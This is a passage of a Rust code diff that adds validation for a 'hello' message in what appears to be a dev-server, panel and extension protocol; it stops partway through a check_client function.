+// ---------------------------------------------------------------------------------------------
+// `hello` validation (story 055, design.md §Wire additions)
+
+/// The limits of a dev-server or panel identity; an extension's has none beyond its shape. A
+/// refusal is a `bad_request`: non-fatal for a hello inside an open session (R9.3), while a
+/// session's first line that fails is refused like any malformed first line.
+fn check_client(client: &ClientInfo) -> Result<(), ChannelError> {
+    match client {
+        ClientInfo::Extension(_) => Ok(()),
